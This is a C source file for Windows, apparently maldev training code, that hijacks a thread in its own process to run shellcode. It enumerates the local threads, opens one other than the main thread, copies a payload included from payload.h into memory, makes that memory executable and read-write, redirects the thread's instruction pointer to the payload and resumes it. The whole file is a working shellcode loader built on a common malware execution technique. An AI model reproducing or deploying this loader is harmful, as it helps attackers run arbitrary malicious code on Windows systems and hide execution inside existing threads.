#include <Windows.h>
#include <stdio.h>
#include <tlhelp32.h>
#include "payload.h"

BOOL GetLocalThreadHandle(IN DWORD dwMainThreadId, OUT DWORD* dwThreadId, OUT HANDLE* hThread) {

	// Getting the local process ID
	DWORD           dwProcessId = GetCurrentProcessId();
	HANDLE          hSnapShot = NULL;
	THREADENTRY32   Thr = {
		.dwSize = sizeof(THREADENTRY32)
	};

	// Takes a snapshot of the currently running processes's threads 
	hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, NULL);
	if (hSnapShot == INVALID_HANDLE_VALUE) {
		printf("\n\t[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	// Retrieves information about the first thread encountered in the snapshot.
	if (!Thread32First(hSnapShot, &Thr)) {
		printf("\n\t[!] Thread32First Failed With Error : %d \n", GetLastError());
		goto _EndOfFunction;
	}

	do {
		// If the thread's PID is equal to the PID of the target process then
		// this thread is running under the target process
		// The 'Thr.th32ThreadID != dwMainThreadId' is to avoid targeting the main thread of our local process
		if (Thr.th32OwnerProcessID == dwProcessId && Thr.th32ThreadID != dwMainThreadId) {

			// Opening a handle to the thread 
			*dwThreadId = Thr.th32ThreadID;
			*hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, Thr.th32ThreadID);

			if (*hThread == NULL)
				printf("\n\t[!] OpenThread Failed With Error : %d \n", GetLastError());

			break;
		}

		// While there are threads remaining in the snapshot
	} while (Thread32Next(hSnapShot, &Thr));


_EndOfFunction:
	if (hSnapShot != NULL)
		CloseHandle(hSnapShot);
	if (*dwThreadId == NULL || *hThread == NULL)
		return FALSE;
	return TRUE;
}


BOOL HijackThread(HANDLE hThread, PVOID pPayload, SIZE_T sPayloadSize) {

	PVOID    pAddress = NULL;
	DWORD    dwOldProtection = NULL;
	CONTEXT	ThreadCtx = {
		.ContextFlags = CONTEXT_ALL
	};


	// Allocating memory for the payload  
	pAddress = VirtualAlloc(NULL, sPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (pAddress == NULL) {
		printf("[!] VirtualAlloc Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	// Copying the payload to the allocated memory  
	memcpy(pAddress, pPayload, sPayloadSize);

	// Changing the memory protection  
	if (!VirtualProtect(pAddress, sPayloadSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
		printf("[!] VirtualProtect Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	SuspendThread(hThread);

	if (!GetThreadContext(hThread, &ThreadCtx)) {
		printf("\t[!] GetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	ThreadCtx.Rip = pAddress;

	if (!SetThreadContext(hThread, &ThreadCtx)) {
		printf("\t[!] SetThreadContext Failed With Error : %d \n", GetLastError());
		return FALSE;
	}

	printf("\t[#] Press <Enter> To Run ... ");
	getchar();

	ResumeThread(hThread);

	WaitForSingleObject(hThread, INFINITE);

	return TRUE;
}

void main() {
	// Getting the main thread ID
	DWORD dwMainThreadId = GetCurrentThreadId();
	HANDLE hThread = NULL;
	DWORD dwThreadId = NULL;
	// Getting the local thread handle
	if (!GetLocalThreadHandle(dwMainThreadId, &dwThreadId, &hThread)) {
		printf("\n\t[!] Failed To Get Local Thread Handle \n");
		return;
	}
	printf("\t[#] Local Thread ID : %d \n", dwThreadId);
	// Hijacking the thread
	if (!HijackThread(hThread, (PVOID)Payload, sizeof(Payload))) {
		printf("\n\t[!] Failed To Hijack Thread \n");
		return;
	}
	CloseHandle(hThread);
	return;
}